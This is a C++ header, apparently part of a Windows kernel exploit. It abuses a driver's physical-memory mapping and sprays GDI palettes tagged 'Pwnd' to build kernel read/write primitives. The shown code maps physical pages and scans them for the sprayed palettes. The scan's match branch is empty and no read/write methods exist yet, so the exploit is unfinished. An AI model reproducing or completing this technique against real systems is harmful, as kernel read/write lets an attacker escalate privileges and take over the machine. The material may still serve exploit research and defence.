#pragma once

#include <array>
#include <algorithm>

#include "EneDriver.h"
#include "Palette.h"

constexpr size_t NUMBER_OF_PALETTES = 0x3000;
constexpr size_t PAGE_SIZE = 0x1000;
constexpr PALETTEENTRY PALETTE_IDENTIFIER = { 'P', 'w', 'n', 'd' };

/*
	Implements kernel virtual read/write primitives
*/
class KernelReadWrite {
private:
	EneDriver driver;
	HPALETTE managerPalette;
	HPALETTE workerPalette;

	/*
		Creates a ton of palettes.
	*/
	VOID SprayPalettes(std::array<HPALETTE, NUMBER_OF_PALETTES>& Palettes) {
		LOGPALETTE palette = { 0 };
		palette.palVersion = 0x300;
		palette.palNumEntries = 2;
		palette.palPalEntry[0] = PALETTE_IDENTIFIER;

		for (UINT32 i = 0; i < NUMBER_OF_PALETTES; ++i) {
			palette.palPalEntry[1] = *reinterpret_cast<PALETTEENTRY*>(&i);
			Palettes[i] = ::CreatePalette(&palette);
		}
	}

	VOID FindWorkerAndManager() {
		// step 1: create a ton of palettes
		std::array<HPALETTE, NUMBER_OF_PALETTES> palettes;
		this->SprayPalettes(palettes);

		ULONG_PTR currentPhysicalAddress = 0;
		PBYTE mappedPaged = nullptr;
		while ((mappedPaged =
			reinterpret_cast<PBYTE>(this->driver.MapPhysicalMemory(PAGE_SIZE, currentPhysicalAddress))) != nullptr) {
			
			for (auto i = 0; i < PAGE_SIZE - sizeof(PALETTEENTRY); ++i) {
				if (*reinterpret_cast<const UINT32*>(&mappedPaged[i]) == *reinterpret_cast<const UINT32*>(&PALETTE_IDENTIFIER)) {
				
				}
			}

			this->driver.UnmapPhysicalMemory(currentPhysicalAddress);
			currentPhysicalAddress += PAGE_SIZE;
		}
	}

public:
	KernelReadWrite(const std::string& DriverPath) : driver(DriverPath), managerPalette(0), workerPalette(0) {

	}


};